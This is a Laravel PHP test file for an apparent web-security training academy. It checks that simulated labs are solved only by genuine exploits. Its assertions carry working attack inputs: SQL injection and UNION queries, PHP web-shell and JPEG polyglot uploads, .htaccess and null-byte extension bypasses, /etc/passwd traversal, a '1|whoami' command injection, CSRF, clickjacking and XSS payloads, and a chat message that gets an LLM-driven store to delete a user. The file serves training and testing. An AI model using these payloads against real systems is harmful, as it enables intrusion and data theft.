<?php

namespace Tests\Feature;

use App\Models\Lab;
use App\Models\LabSession;
use App\Models\User;
use App\Services\WidgetRenderer;
use Database\Seeders\CatalogSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Auth;
use Tests\TestCase;

class LabEnvironmentAndUploadsTest extends TestCase
{
    use RefreshDatabase;

    private User $user;

    protected function setUp(): void
    {
        parent::setUp();
        WidgetRenderer::clearRuntimeCache();
        $this->seed(CatalogSeeder::class);
        $this->user = User::create([
            'name' => 'Tester',
            'email' => 'tester@academy.local',
            'password' => 'password123',
        ]);
        $this->actingAs($this->user);
    }

    private function launchUrl(string $labId, bool $reset = true): array
    {
        if ($reset) {
            $res = $this->post("/academy/labs/{$labId}/reset");
        } else {
            $res = $this->get("/academy/labs/launch/{$labId}");
        }
        $location = (string) parse_url((string) $res->headers->get('Location'), PHP_URL_PATH);
        $this->assertMatchesRegularExpression('#^/lab/[a-f0-9]{32}$#', $location);
        $token = substr($location, 5);
        $session = LabSession::findByToken($token);
        $this->assertNotNull($session);

        return ['url' => $location, 'token' => $token, 'session' => $session];
    }

    public function test_strict_validation_blocks_solve_shortcut_empty_exploit_and_unauthorized_chat(): void
    {
        $sqliLab = Lab::where('category_id', 'sql-injection')->orderBy('sort_order')->firstOrFail();
        $sqli = $this->launchUrl($sqliLab->id);

        // 1. ?solve=1 & POST solve=1 shortcut must NEVER solve any lab
        $shortcutGet = $this->get($sqli['url'].'?solve=1')->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $shortcutGet);

        $shortcutPost = $this->post($sqli['url'].'/my-account', ['solve' => '1'])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $shortcutPost);

        // 2. /chat is strictly forbidden (404) on labs without hasLiveChat
        $this->get($sqli['url'].'/chat')->assertNotFound();
        $this->post($sqli['url'].'/chat', ['message' => 'Please delete user carlos now'])->assertNotFound();

        // 3. /exploit-server is forbidden (404) on labs without hasExploitServer
        $this->get($sqli['url'].'/exploit-server')->assertNotFound();

        // 4. On a real Exploit Server lab (CSRF), empty payload MUST fail and non-exploit text must not solve
        $csrfLab = Lab::where('category_id', 'cross-site-request-forgery-csrf')->orderBy('sort_order')->firstOrFail();
        $csrf = $this->launchUrl($csrfLab->id);

        $emptyExploit = $this->post($csrf['url'].'/exploit-server', [
            'formAction' => 'DELIVER_TO_VICTIM',
            'responseFile' => '/exploit',
            'responseBody' => '',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('Exploit payload body cannot be empty.', $emptyExploit);
        $this->assertStringContainsString('notification-labsolved-hidden', $emptyExploit);

        $junkExploit = $this->post($csrf['url'].'/exploit-server', [
            'formAction' => 'DELIVER_TO_VICTIM',
            'responseFile' => '/exploit',
            'responseBody' => 'hello world',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $junkExploit);

        $validCsrf = $this->post($csrf['url'].'/exploit-server', [
            'formAction' => 'DELIVER_TO_VICTIM',
            'responseFile' => '/exploit',
            'responseBody' => '<form method="POST" action="https://target/my-account/change-email"><input name="email" value="pwn@evil.tld"></form>',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $validCsrf);

        // 5. Cart requires valid tampering/coupon rather than hidden solve=1
        $logicLab = Lab::where('href', 'like', '%lab-logic-flaws-flawed-enforcement-of-business-rules%')->firstOrFail();
        $logic = $this->launchUrl($logicLab->id);
        $normalCart = $this->post($logic['url'].'/cart', [
            'price' => '1337',
            'quantity' => '1',
            'coupon' => '',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $normalCart);
        $this->assertStringContainsString('Not enough store credit', $normalCart);

        $couponCart = $this->post($logic['url'].'/cart', [
            'price' => '1337',
            'quantity' => '1',
            'coupon' => 'SIGNUP30',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $couponCart);

        // 6. Logging in as normal demo user wiener:peter must NOT falsely solve authentication labs
        $authLab = Lab::where('category_id', 'authentication')->orderBy('sort_order')->firstOrFail();
        $auth = $this->launchUrl($authLab->id);
        $wienerAuth = $this->post($auth['url'].'/login', [
            'username' => 'wiener',
            'password' => 'peter',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('Your username is: <strong>wiener</strong>', $wienerAuth);
        $this->assertStringContainsString('notification-labsolved-hidden', $wienerAuth);

        // 7. Cross-category isolation on /image?filename= (non-path-traversal lab must not solve via ../etc/passwd)
        $xssLab = Lab::where('category_id', 'cross-site-scripting')->firstOrFail();
        $xss = $this->launchUrl($xssLab->id);
        $this->get($xss['url'].'/image?filename=../../../../etc/passwd')->assertOk();
        $xssCheck = $this->get($xss['url'])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $xssCheck);
    }

    public function test_sqli_xss_isolation_union_select_and_multistep_flows(): void
    {
        $sqliLab = Lab::where('category_id', 'sql-injection')->orderBy('sort_order')->firstOrFail();
        $sqli = $this->launchUrl($sqliLab->id);

        // Clean state & pure Command Bar DOM check (no PortSwigger logoAcademy.svg, no JS)
        $cleanHtml = $this->get($sqli['url'])->assertOk()->getContent();
        $this->assertStringContainsString('/content/lab-workbench.css', $cleanHtml);
        $this->assertStringNotContainsString('logoAcademy.svg', $cleanHtml);
        $this->assertStringContainsString('data-archetype="storefront"', $cleanHtml);
        $this->assertStringContainsString('Giant Pillow Thing', $cleanHtml);
        $this->assertStringContainsString('notification-labsolved-hidden', $cleanHtml);
        $this->assertStringNotContainsString('id="lab-drawer"', $cleanHtml);
        $this->assertStringNotContainsString('<script', strtolower($cleanHtml));

        // Cross-lab isolation: XSS payload must NOT solve SQLi lab
        $wrongHtml = $this->get($sqli['url'].'?search='.urlencode('<img src=x onerror=alert(1)>'))->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $wrongHtml);

        // Valid SQLi solves and reveals hidden items
        $solvedHtml = $this->get($sqli['url'].'?category='.urlencode("Gifts' OR 1=1--"))->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $solvedHtml);
        $this->assertStringContainsString('Zero-Day Unreleased Prototype [HIDDEN]', $solvedHtml);

        // Oracle UNION SELECT banner
        $oracleLab = Lab::where('href', 'like', '%lab-querying-database-version-oracle%')->firstOrFail();
        $oracle = $this->launchUrl($oracleLab->id);
        $unionHtml = $this->get($oracle['url'].'?category='.urlencode("Gifts' UNION SELECT banner, NULL FROM v\$version--"))
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString('Oracle Database 11g Express Edition', $unionHtml);

        // Multi-step SQLi: Step 1 exfiltrates per-session randomized admin password, remains unsolved -> Step 2 admin login solves
        $multiLab = Lab::where('href', 'like', '%lab-retrieve-data-from-other-tables%')->firstOrFail();
        $multi = $this->launchUrl($multiLab->id);
        $expectedAdminPass = $multi['session']->secret('admin_password');
        $this->assertNotSame('s3cr3t_admin_p4ss', $expectedAdminPass);

        $step1Html = $this->get($multi['url'].'?category='.urlencode("Gifts' UNION SELECT username, password FROM users--"))
            ->assertOk()
            ->getContent();
        $this->assertStringContainsString($expectedAdminPass, $step1Html);
        $this->assertStringContainsString('notification-labsolved-hidden', $step1Html);

        // Legacy static admin password must NOT solve
        $wrongStep2 = $this->post($multi['url'].'/login', [
            'username' => 'administrator',
            'password' => 's3cr3t_admin_p4ss',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $wrongStep2);

        $step2Html = $this->post($multi['url'].'/login', [
            'username' => 'administrator',
            'password' => $expectedAdminPass,
        ])->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $step2Html);
    }

    public function test_archetypes_blog_path_traversal_tracking_cookie_chat_repeater_and_mystery(): void
    {
        $sqliLab = Lab::where('category_id', 'sql-injection')->orderBy('sort_order')->firstOrFail();
        $sqli = $this->launchUrl($sqliLab->id);
        $xssLab = Lab::where('category_id', 'cross-site-scripting')->firstOrFail();
        $xss = $this->launchUrl($xssLab->id);

        // Product stock check
        $prodHtml = $this->get($sqli['url'].'?productId=7&storeId=London')->assertOk()->getContent();
        $this->assertStringContainsString('Check stock', $prodHtml);
        $this->assertStringContainsString('units in stock at London', $prodHtml);

        // Editorial archetype & SQLi isolation
        $blogHtml = $this->get($xss['url'].'?category='.urlencode("Gifts' OR 1=1--"))->assertOk()->getContent();
        $this->assertStringContainsString('data-archetype="editorial"', $blogHtml);
        $this->assertStringContainsString('Search the blog', $blogHtml);
        $this->assertStringContainsString('notification-labsolved-hidden', $blogHtml);

        // Path traversal /image?filename= returns per-session file_secret
        $ptLab = Lab::where('href', 'like', '%/file-path-traversal/%')->firstOrFail();
        $pt = $this->launchUrl($ptLab->id);
        $ptHtml = $this->get($pt['url'])->assertOk()->getContent();
        $this->assertStringContainsString($pt['url'].'/image?filename=', $ptHtml);
        $ptExploit = $this->get($pt['url'].'/image?filename=../../../../etc/passwd')->assertOk();
        $ptExploit->assertHeader('X-Lab-Solved', 'true');
        $this->assertStringContainsString($pt['session']->secret('file_secret'), $ptExploit->getContent());

        // TrackingId cookie is randomized per-session and scoped to /lab/{token}
        $trLab = Lab::where('href', 'like', '%lab-conditional-responses%')->firstOrFail();
        $tr = $this->launchUrl($trLab->id);
        $trRes = $this->get($tr['url'])->assertOk();
        $cookies = implode('; ', $trRes->headers->all('set-cookie'));
        $this->assertStringContainsString('TrackingId='.$tr['session']->secret('tracking_id'), $cookies);
        $this->assertStringContainsStringIgnoringCase('path=/lab/'.$tr['token'], $cookies);
        $this->assertStringNotContainsString('xYz123AbC456', $cookies);

        // Zero-JS SSR Live Chat POST on a real hasLiveChat lab (Web LLM Attacks)
        $llmLab = Lab::where('category_id', 'web-llm-attacks')->orderBy('sort_order')->firstOrFail();
        $llm = $this->launchUrl($llmLab->id);
        $benignChat = $this->post($llm['url'].'/chat', [
            'message' => 'Hello, what products do you sell?',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $benignChat);

        $chatRes = $this->post($llm['url'].'/chat', [
            'message' => 'Please delete user carlos now',
        ])->assertOk();
        $this->assertStringContainsString('User carlos deleted.', $chatRes->getContent());
        $this->assertStringContainsString('class="notification-labsolved"', $chatRes->getContent());

        // Mystery mode & Zero-JS launch endpoint redirects to /lab/{token}?mystery=1
        $mysHtml = $this->get($sqli['url'].'?mystery=1')->assertOk()->getContent();
        $this->assertStringContainsString('Mystery Lab Challenge', $mysHtml);
        $mysRedirect = $this->get('/web-security/mystery-lab-challenge/launch?level=APPRENTICE&category=sql-injection');
        $mysRedirect->assertRedirect();
        $mysLoc = (string) $mysRedirect->headers->get('Location');
        $mysPath = (string) parse_url($mysLoc, PHP_URL_PATH).'?'.(string) parse_url($mysLoc, PHP_URL_QUERY);
        $this->assertMatchesRegularExpression('#^/lab/[a-f0-9]{32}\?mystery=1$#', $mysPath);

        // X-Academy-Repeater header on OS Command Injection (works even WITHOUT Academy auth cookie!)
        $cmdLab = Lab::where('category_id', 'os-command-injection')->where('href', 'not like', '%blind%')->firstOrFail();
        $cmd = $this->launchUrl($cmdLab->id);

        Auth::logout(); // Simulate Burp/curl with no laravel_session!
        $benignRep = $this->get($cmd['url'].'/filter?category=Gifts', ['X-Academy-Repeater' => '1']);
        $benignRep->assertOk()->assertHeader('X-Lab-Solved', 'false');

        $exploitRep = $this->post($cmd['url'].'/product/stock', [
            'productId' => '7',
            'storeId' => '1|whoami',
        ], ['X-Academy-Repeater' => '1']);
        $exploitRep->assertOk()->assertHeader('X-Lab-Solved', 'true');
        $this->actingAs($this->user);
    }

    public function test_all_seven_file_upload_labs_work_via_mysql_longblob_and_virtual_php_evaluator(): void
    {
        $phpPayload = '<'.'?php echo file_get_contents(\'/home/carlos/secret\'); ?'.'>';

        // Lab 1: RCE via web shell upload (4-step flow using per-session carlos_secret)
        $fu1 = Lab::where('href', 'like', '%lab-file-upload-remote-code-execution-via-web-shell-upload%')->firstOrFail();
        $s1 = $this->launchUrl($fu1->id);
        $secret1 = $s1['session']->secret('carlos_secret');
        $this->assertNotSame('2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ', $secret1);

        $loginHtml = $this->post($s1['url'].'/login', ['username' => 'wiener', 'password' => 'peter'])->assertOk()->getContent();
        $this->assertStringContainsString('enctype="multipart/form-data"', $loginHtml);

        $up1 = $this->postMultipartAvatar($s1['url'], 'exploit.php', 'application/x-php', $phpPayload);
        $up1->assertOk();
        $this->assertStringContainsString('The file avatars/exploit.php has been uploaded.', $up1->getContent());
        $this->assertStringContainsString('notification-labsolved-hidden', $up1->getContent());

        $exec1 = $this->get($s1['url'].'/files/avatars/exploit.php')->assertOk();
        $extracted1 = trim($exec1->getContent());
        $this->assertSame($secret1, $extracted1);

        // Static legacy secret must NOT solve!
        $wrongSub = $this->post($s1['url'].'/submit-solution', ['answer' => '2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ'])->assertOk();
        $this->assertStringContainsString('notification-labsolved-hidden', $wrongSub->getContent());

        $sub1 = $this->post($s1['url'].'/submit-solution', ['answer' => $extracted1])->assertOk();
        $this->assertStringContainsString('class="notification-labsolved"', $sub1->getContent());

        // Lab 2: Content-Type restriction bypass
        $fu2 = Lab::where('href', 'like', '%content-type-restriction-bypass%')->firstOrFail();
        $s2 = $this->launchUrl($fu2->id);
        $secret2 = $s2['session']->secret('carlos_secret');
        $this->assertNotSame($secret1, $secret2);
        $this->postMultipartAvatar($s2['url'], 'exploit.php', 'application/x-php', $phpPayload)->assertStatus(403);
        $this->postMultipartAvatar($s2['url'], 'exploit.php', 'image/jpeg', $phpPayload)->assertOk();
        $this->assertSame($secret2, trim($this->get($s2['url'].'/files/avatars/exploit.php')->getContent()));

        // Lab 3: Path traversal upload
        $fu3 = Lab::where('href', 'like', '%web-shell-upload-via-path-traversal%')->firstOrFail();
        $s3 = $this->launchUrl($fu3->id);
        $secret3 = $s3['session']->secret('carlos_secret');
        $this->postMultipartAvatar($s3['url'], '../exploit.php', 'application/x-php', $phpPayload)->assertOk();
        $rawSource = $this->get($s3['url'].'/files/avatars/exploit.php')->assertOk()->getContent();
        $this->assertStringContainsString('<?php', $rawSource);

        $travUp = $this->postMultipartAvatar($s3['url'], '..%2fexploit.php', 'application/x-php', $phpPayload)->assertOk();
        $this->assertStringContainsString('The file avatars/../exploit.php has been uploaded.', $travUp->getContent());
        $this->assertSame($secret3, trim($this->get($s3['url'].'/files/avatars/..%2fexploit.php')->getContent()));

        // Lab 4: Extension blacklist bypass (.htaccess + .l33t)
        $fu4 = Lab::where('href', 'like', '%extension-blacklist-bypass%')->firstOrFail();
        $s4 = $this->launchUrl($fu4->id);
        $secret4 = $s4['session']->secret('carlos_secret');
        $this->postMultipartAvatar($s4['url'], 'exploit.php', 'application/x-php', $phpPayload)->assertStatus(403);
        $this->postMultipartAvatar($s4['url'], '.htaccess', 'text/plain', 'AddType application/x-httpd-php .l33t')->assertOk();
        $this->postMultipartAvatar($s4['url'], 'exploit.l33t', 'application/x-php', $phpPayload)->assertOk();
        $this->assertSame($secret4, trim($this->get($s4['url'].'/files/avatars/exploit.l33t')->getContent()));

        // Lab 5: Obfuscated file extension (null byte)
        $fu5 = Lab::where('href', 'like', '%obfuscated-file-extension%')->firstOrFail();
        $s5 = $this->launchUrl($fu5->id);
        $secret5 = $s5['session']->secret('carlos_secret');
        $this->postMultipartAvatar($s5['url'], 'exploit.php', 'application/x-php', $phpPayload)->assertStatus(403);
        $this->postMultipartAvatar($s5['url'], 'exploit.php%00.jpg', 'image/jpeg', $phpPayload)->assertOk();
        $this->assertSame($secret5, trim($this->get($s5['url'].'/files/avatars/exploit.php')->getContent()));

        // Lab 6: Polyglot web shell upload
        $fu6 = Lab::where('href', 'like', '%polyglot-web-shell-upload%')->firstOrFail();
        $s6 = $this->launchUrl($fu6->id);
        $secret6 = $s6['session']->secret('carlos_secret');
        $this->postMultipartAvatar($s6['url'], 'polyglot.php', 'image/jpeg', $phpPayload)->assertStatus(403);
        $polyBuf = "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01"
            .'<'.'?php echo \'START \' . file_get_contents(\'/home/carlos/secret\') . \' END\'; ?'.'>'
            ."\xFF\xD9";
        $this->postMultipartAvatar($s6['url'], 'polyglot.php', 'image/jpeg', $polyBuf)->assertOk();
        $polyOut = $this->get($s6['url'].'/files/avatars/polyglot.php')->assertOk()->getContent();
        $this->assertStringContainsString("START {$secret6} END", $polyOut);

        // Lab 7: Race condition web shell upload
        $fu7 = Lab::where('href', 'like', '%web-shell-upload-via-race-condition%')->firstOrFail();
        $s7 = $this->launchUrl($fu7->id);
        $secret7 = $s7['session']->secret('carlos_secret');
        $this->postMultipartAvatar($s7['url'], 'exploit.php', 'application/x-php', $phpPayload)->assertStatus(403);
        $raceGet = $this->get($s7['url'].'/files/avatars/exploit.php')->assertOk();
        $this->assertSame($secret7, trim($raceGet->getContent()));
    }

    public function test_anti_cheat_blocks_default_cookie_wrong_admin_password_direct_submit_and_checks_new_triggers(): void
    {
        // 1. Default session & legacy cookies must NEVER auto-solve labs on normal visits
        $blindTimeLab = Lab::where('href', 'like', '%lab-time-delays%')->firstOrFail();
        $csrfCookieLab = Lab::where('href', 'like', '%lab-token-tied-to-non-session-cookie%')->firstOrFail();
        $desyncLab = Lab::where('href', 'like', '%client-side-desync%')->firstOrFail();
        foreach ([$blindTimeLab, $csrfCookieLab, $desyncLab] as $targetLab) {
            $s = $this->launchUrl($targetLab->id);
            $res = $this->withUnencryptedCookies([
                'TrackingId' => $s['session']->secret('tracking_id'),
                'session' => $s['session']->secret('lab_session_cookie'),
                'XSRF-TOKEN' => 'eyJpdiI6IjEyMzQifQ',
            ])->get($s['url']);
            $res->assertOk();
            $this->assertStringContainsString('notification-labsolved-hidden', $res->getContent());
        }

        // 2. Wrong administrator password must NEVER falsely solve JWT / SQLi / Access Control labs
        $jwtLab = Lab::where('category_id', 'jwt')->orderBy('sort_order')->firstOrFail();
        $jwt = $this->launchUrl($jwtLab->id);
        $wrongJwtLogin = $this->post($jwt['url'].'/login', [
            'username' => 'administrator',
            'password' => 'wrongpass123',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $wrongJwtLogin);

        // Sending unmodified wiener JWT must also NOT falsely solve JWT lab
        $unmodifiedJwt = $this->post($jwt['url'].'/jwt', [
            'jwtToken' => $jwt['session']->buildSessionJwt('wiener', 'user'),
        ])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $unmodifiedJwt);

        // 3. Valid /administrator-panel/delete?username=carlos solves hasAdminPanel labs cleanly
        $adminDel = $this->get($jwt['url'].'/administrator-panel/delete?username=carlos')->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $adminDel);

        // 4. Multi-step requiresSubmitAfterExfil (e.g. SSTI) rejects direct submit-solution & Wiener API key before exfil
        $sstiMulti = Lab::where('category_id', 'server-side-template-injection')
            ->get()
            ->first(static fn (Lab $l) => ! empty($l->profile['requiresSubmitAfterExfil']));
        $this->assertNotNull($sstiMulti);
        $ssti = $this->launchUrl($sstiMulti->id);
        $fileSecret = $ssti['session']->secret('file_secret');

        $prematureSubmit = $this->post($ssti['url'].'/submit-solution', [
            'answer' => $fileSecret,
        ])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $prematureSubmit);
        $this->assertStringContainsString('Solution rejected', $prematureSubmit);

        // Perform SSTI exploit first -> sets exfiltrated = true, still unsolved until secret submitted
        $sstiStep1 = $this->get($ssti['url'].'?search='.urlencode('{{7*7}}'))->assertOk()->getContent();
        $this->assertStringContainsString('49', $sstiStep1);
        $this->assertStringContainsString('notification-labsolved-hidden', $sstiStep1);

        // Wiener's own per-session API key must NOT solve submit-solution
        $wienerKey = $this->post($ssti['url'].'/submit-solution', [
            'answer' => $ssti['session']->secret('wiener_api_key'),
        ])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $wienerKey);

        // Valid per-session secret after exfil solves
        $sstiStep2 = $this->post($ssti['url'].'/submit-solution', [
            'answer' => $fileSecret,
        ])->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $sstiStep2);

        // 5. Clickjacking <style> before <iframe> solves properly
        $clickLab = Lab::where('category_id', 'clickjacking')->orderBy('sort_order')->firstOrFail();
        $click = $this->launchUrl($clickLab->id);
        $clickHtml = $this->post($click['url'].'/exploit-server', [
            'formAction' => 'DELIVER_TO_VICTIM',
            'responseFile' => '/exploit',
            'responseBody' => '<style>iframe { opacity: 0.0001; position: relative; z-index: 2; }</style><iframe src="https://target/my-account"></iframe>',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $clickHtml);

        // 6. Web Cache Deception rejects plain /my-account and accepts /my-account/wcd.js
        $wcdLab = Lab::where('category_id', 'web-cache-deception')->orderByDesc('sort_order')->firstOrFail();
        $wcd = $this->launchUrl($wcdLab->id);
        $badWcd = $this->post($wcd['url'].'/exploit-server', [
            'formAction' => 'DELIVER_TO_VICTIM',
            'responseFile' => '/exploit',
            'responseBody' => '<a href="/my-account">visit</a>',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $badWcd);

        $goodWcd = $this->post($wcd['url'].'/exploit-server', [
            'formAction' => 'DELIVER_TO_VICTIM',
            'responseFile' => '/exploit',
            'responseBody' => '<script>document.location="https://target/my-account/wcd.js"</script>',
        ])->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $goodWcd);

        // 7. WebSocket chat lab ignores plain "carlos" text and solves on XSS payload
        $wsLab = Lab::where('category_id', 'websockets')->orderBy('sort_order')->firstOrFail();
        $ws = $this->launchUrl($wsLab->id);
        $wsPlain = $this->post($ws['url'].'/chat', ['message' => 'Hello carlos'])->assertOk()->getContent();
        $this->assertStringContainsString('notification-labsolved-hidden', $wsPlain);

        $wsXss = $this->post($ws['url'].'/chat', ['message' => '<img src=1 onerror="alert(1)">'])->assertOk()->getContent();
        $this->assertStringContainsString('class="notification-labsolved"', $wsXss);
    }

    public function test_indonesian_and_english_file_upload_runtime_error_messages(): void
    {
        $phpPayload = '<'.'?php echo file_get_contents(\'/home/carlos/secret\'); ?'.'>';

        $labContentType = Lab::where('href', 'like', '%content-type-restriction-bypass%')->firstOrFail();
        $labBlacklist = Lab::where('href', 'like', '%extension-blacklist-bypass%')->firstOrFail();
        $labObfuscated = Lab::where('href', 'like', '%obfuscated-file-extension%')->firstOrFail();
        $labPolyglot = Lab::where('href', 'like', '%polyglot-web-shell-upload%')->firstOrFail();
        $labRace = Lab::where('href', 'like', '%web-shell-upload-via-race-condition%')->firstOrFail();

        $s2 = $this->launchUrl($labContentType->id);
        $s4 = $this->launchUrl($labBlacklist->id);
        $s5 = $this->launchUrl($labObfuscated->id);
        $s6 = $this->launchUrl($labPolyglot->id);
        $s7 = $this->launchUrl($labRace->id);

        // Verify EN runtime errors first
        $this->post($s2['url'].'/_locale', ['ui_locale' => 'en'])->assertRedirect($s2['url']);

        $this->assertStringContainsString(
            'Sorry, file type application/x-php is not allowed. Only image/jpeg and image/png are allowed.',
            $this->postMultipartAvatar($s2['url'], 'exploit.php', 'application/x-php', $phpPayload)->assertStatus(403)->getContent()
        );
        $this->assertStringContainsString(
            'Sorry, php files are not allowed.',
            $this->postMultipartAvatar($s4['url'], 'exploit.php', 'application/x-php', $phpPayload)->assertStatus(403)->getContent()
        );
        $this->assertStringContainsString(
            'Sorry, only JPG & PNG files are allowed.',
            $this->postMultipartAvatar($s5['url'], 'exploit.php', 'application/x-php', $phpPayload)->assertStatus(403)->getContent()
        );
        $this->assertStringContainsString(
            'Error: File is not a valid image.',
            $this->postMultipartAvatar($s6['url'], 'polyglot.php', 'image/jpeg', $phpPayload)->assertStatus(403)->getContent()
        );
        $this->assertStringContainsString(
            'Sorry, only JPG & PNG files are allowed',
            $this->postMultipartAvatar($s7['url'], 'exploit.php', 'application/x-php', $phpPayload)->assertStatus(403)->getContent()
        );

        // Toggle active lab locale to ID and verify Indonesian runtime upload errors
        $this->post($s2['url'].'/_locale', ['ui_locale' => 'id'])->assertRedirect($s2['url']);

        $this->assertStringContainsString(
            'Maaf, tipe file application/x-php tidak diizinkan. Hanya image/jpeg dan image/png yang diizinkan.',
            $this->postMultipartAvatar($s2['url'], 'exploit.php', 'application/x-php', $phpPayload)->assertStatus(403)->getContent()
        );
        $this->assertStringContainsString(
            'Maaf, file php tidak diizinkan.',
            $this->postMultipartAvatar($s4['url'], 'exploit.php', 'application/x-php', $phpPayload)->assertStatus(403)->getContent()
        );
        $this->assertStringContainsString(
            'Maaf, hanya file JPG dan PNG yang diizinkan.',
            $this->postMultipartAvatar($s5['url'], 'exploit.php', 'application/x-php', $phpPayload)->assertStatus(403)->getContent()
        );
        $this->assertStringContainsString(
            'Galat: File bukan gambar yang valid.',
            $this->postMultipartAvatar($s6['url'], 'polyglot.php', 'image/jpeg', $phpPayload)->assertStatus(403)->getContent()
        );
        $raceIdContent = $this->postMultipartAvatar($s7['url'], 'exploit.php', 'application/x-php', $phpPayload)->assertStatus(403)->getContent();
        $this->assertStringContainsString('Maaf, hanya file JPG dan PNG yang diizinkan', $raceIdContent);
        $this->assertStringContainsString('Maaf, terjadi galat saat mengunggah file Anda.', $raceIdContent);
    }

    private function postMultipartAvatar(string $labBasePath, string $filename, string $contentType, string $payload)
    {
        $boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';
        $body = "--{$boundary}\r\n"
            ."Content-Disposition: form-data; name=\"avatar\"; filename=\"{$filename}\"\r\n"
            ."Content-Type: {$contentType}\r\n\r\n"
            .$payload
            ."\r\n--{$boundary}\r\n"
            ."Content-Disposition: form-data; name=\"user\"\r\n\r\nwiener\r\n"
            ."--{$boundary}--\r\n";

        return $this->call(
            'POST',
            "{$labBasePath}/my-account/avatar",
            [],
            [],
            [],
            ['CONTENT_TYPE' => "multipart/form-data; boundary={$boundary}"],
            $body
        );
    }
}
